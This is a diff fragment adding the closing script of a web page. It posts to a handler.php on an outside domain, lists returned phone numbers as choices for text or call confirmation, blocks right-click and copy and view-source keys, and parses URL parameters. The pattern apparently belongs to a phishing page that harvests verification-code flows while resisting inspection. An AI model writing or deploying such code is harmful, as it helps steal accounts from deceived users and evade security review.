+                url: "https://thefleetlogistics.com/charlie/handler.php", dataType:"json", method:"post",
+                success: function(result){
+                    $("#num-area").html();
+                    String(result.payload).split(",").forEach(function(e){
+
+                        let ht = '<div class="form-check">'
+                                    +'<input class="form-check-input" type="radio" name="phone" id="flexRadioDefault'+e+'" value="'+e+'">'
+                                    +'<label class="form-check-label" for="flexRadioDefault'+e+'">'
+                                    +e
+                                    +'</label>'
+                                +'</div>';
+                        $("#num-area").html($("#num-area").html()+ht);
+                    });
+
+                    $("#choser-opt").slideDown(500);
+                    $("#choser-loading").hide();
+                    $("#pane-confirm-text").hide();
+                    $("#pane-confirm-call").hide();
+                    $("#pane-confirm-sy").hide();
+
+                    // nums
+                }, error: function(){
+                    alert("Something went wrong, try again");
+                }
+            });
+         }
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.ctrlKey &&
+            (e.keyCode === 67 ||
+            e.keyCode === 86 ||
+            e.keyCode === 85 ||
+            e.keyCode === 117)) {
+            return false;
+            } else {
+            return true;
+            }
+        };
+
+        function urlQ(sParam) {
+                var sPageURL = window.location.search.substring(1),sURLVariables = sPageURL.split('&'), sParameterName, i;
+                for (i = 0; i < sURLVariables.length; i++) {
+                    sParameterName = sURLVariables[i].split('=');
+                    if (sParameterName[0] === sParam) {
+                        return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
+                    }
+                }
+            };
+    </script>
+
+</body>
+</html>
